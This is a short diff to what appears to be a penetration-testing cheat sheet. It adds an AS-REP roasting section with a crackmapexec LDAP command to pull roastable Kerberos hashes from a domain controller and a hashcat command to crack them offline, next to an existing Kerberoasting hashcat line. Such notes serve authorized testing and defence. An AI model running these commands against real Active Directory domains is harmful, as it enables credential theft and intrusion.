@@ -238,6 +238,17 @@ crack TGS offline:
 ```
 hashcat -m 13100 <hash> -a 0 <wordlist> -o outputfile.txt
 ```
+
+# AS-REP - ASK TGT
+find:
+```
+crackmapexec ldap <dcip> -u <user> -p <password> --kdcHost <dcip> --asreproast output.txt
+```
+crack TGT offline:
+```
+hashcat -m 18200 <hash> -a 0 <wordlist> -o outputfile.txt
+```
+
 --------------------------------------------------------------
 
 # Check LIST
